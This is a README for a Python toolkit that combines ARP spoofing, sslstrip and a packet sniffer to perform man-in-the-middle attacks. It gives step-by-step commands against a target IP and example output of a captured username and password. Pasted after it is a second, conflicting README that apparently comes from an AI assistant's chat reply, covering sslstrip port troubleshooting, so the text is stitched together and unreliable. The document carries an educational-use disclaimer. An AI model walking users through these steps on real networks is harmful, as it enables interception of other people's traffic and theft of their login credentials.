# Packet Sniffer Project

## Overview

The Packet Sniffer project is a collection of Python scripts designed for network security testing and analysis. It includes tools for ARP spoofing and packet sniffing, enabling users to monitor network traffic and capture sensitive information such as login credentials.

## Features

- **ARP Spoofer**: Redirect network traffic between devices on the same network.
- **Packet Sniffer**: Capture and analyze network packets to extract useful information.

## Requirements

- Python 3.x
- Scapy
- sslstrip

## Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/arifbinekram/Packet-Sniffer.git
   ```

2. Navigate to the ARP spoofer directory:

   ```bash
   cd Packet-Sniffer/arp\ spoofer
   ```

3. Ensure you have the required dependencies installed. You can install Scapy using pip:

   ```bash
   pip install scapy
   ```

4. For `sslstrip`, you might need to install it manually or use your package manager:

   ```bash
   sudo apt-get install sslstrip
   ```

## Usage

### ARP Spoofer

The ARP spoofer script redirects traffic between a target device and the gateway.

1. Run the ARP spoofer:

   ```bash
   python arp_spoof.py -t <target_ip> -s <spoof_ip>
   ```

   Replace `<target_ip>` with the IP address of the target device and `<spoof_ip>` with the IP address of the gateway.

### SSL Strip

To strip SSL/TLS from the traffic, run `sslstrip` in a separate terminal:

   ```bash
   sslstrip
   ```

### Packet Sniffer

The packet sniffer script captures and analyzes network packets.

1. Navigate to the packet sniffer directory:

   ```bash
   cd ../packet\ sniffer
   ```

2. Run the packet sniffer:

   ```bash
   python packet_sniffer.py
   ```

   The script will start capturing HTTP requests and possible login credentials.

## Example

Here is an example of how to use the tools together:

1. Start ARP spoofing:

   ```bash
   cd Packet-Sniffer/arp\ spoofer
   python arp_spoof.py -t 10.0.2.4 -s 10.0.2.1
   ```

2. In a separate terminal, run `sslstrip`:

   ```bash
   sslstrip
   ```

3. Start the packet sniffer:

   ```bash
   cd ../packet\ sniffer
   python packet_sniffer.py
   ```

   Example output:

   ```text
   [+] HTTP Request > www.sxtmgc.com/admin/loginvalidate.php
   [+] Possible username and password: username=packetsniffer%40gmail.com&password=wefergrhsdffr&submit=
   ```

## Disclaimer

This project is intended for educational purposes only. Unauthorized interception of network traffic is illegal and unethical. Use this tool responsibly and only on networks where you have explicit permission to test.
Here's the updated `README.md` file with the added instructions on how to resolve the `Address already in use` error when using `sslstrip`:

```markdown
# Packet Sniffer

This project is a simple packet sniffer written in Python.

## Installation

1. Clone the repository:
   ```sh
   git clone https://github.com/arifbinekram/Packet-Sniffer.git
   cd Packet-Sniffer
   ```

2. Install required dependencies:
   ```sh
   pip install -r requirements.txt
   ```

## Usage

To run the packet sniffer, use the following command:
```sh
python sniffer.py
```



### Running sslstrip

To use `sslstrip` with your ARP spoofer, follow these steps:

1. Run `sslstrip`:
   ```sh
   sslstrip
   ```

   If you encounter the following error:
   ```sh
   Traceback (most recent call last):
     File "/usr/lib/python3/dist-packages/twisted/internet/tcp.py", line 1346, in startListening
       skt.bind(addr)
   OSError: [Errno 98] Address already in use

   During handling of the above exception, another exception occurred:

   Traceback (most recent call last):
     File "/usr/bin/sslstrip", line 112, in <module>
       main(sys.argv[1:])
     File "/usr/bin/sslstrip", line 104, in main
       reactor.listenTCP(int(listenPort), strippingFactory)
     File "/usr/lib/python3/dist-packages/twisted/internet/posixbase.py", line 364, in listenTCP
       p.startListening()
     File "/usr/lib/python3/dist-packages/twisted/internet/tcp.py", line 1348, in startListening
       raise CannotListenError(self.interface, self.port, le)
   twisted.internet.error.CannotListenError: Couldn't listen on any:10000: [Errno 98] Address already in use.
   ```

2. Check which process is using port `10000`:
   ```sh
   lsof -i :10000
   ```

   Example output:
   ```sh
   COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
   sslstrip 57398 root    8u  IPv4 111068      0t0  TCP *:webmin (LISTEN)
   ```

3. Stop the conflicting process:
   ```sh
   kill -9 57398
   ```

   Replace `57398` with the actual PID from the output.

4. Run `sslstrip` again:
   ```sh
   sslstrip
   ```

Alternatively, you can choose a different port for `sslstrip`:
```sh
sslstrip -l 10001
```

Now `sslstrip` should be running without any issues.

## Contributing

Feel free to submit issues or pull requests if you find any bugs or have suggestions for improvements.


Add these instructions to your `README.md` file to help users troubleshoot and resolve the port conflict issue when running `sslstrip`.

---

Feel free to contribute to this project by submitting issues or pull requests to the GitHub repository.
